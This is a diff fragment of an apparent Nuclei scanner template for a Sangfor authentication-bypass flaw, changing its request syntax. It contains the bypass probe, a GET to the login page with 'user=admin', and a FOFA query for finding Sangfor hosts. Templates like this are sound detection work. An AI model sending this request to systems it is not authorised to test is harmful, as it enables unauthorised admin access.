@@ -11,11 +11,10 @@ info:
     cvss-score: 8.1
     cwe-id: CWE-287
   metadata:
-    max-request: 1
     fofa-query: app="sangfor"
   tags: sangfor,auth-bypass,login
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/ui/login.php?user=admin"
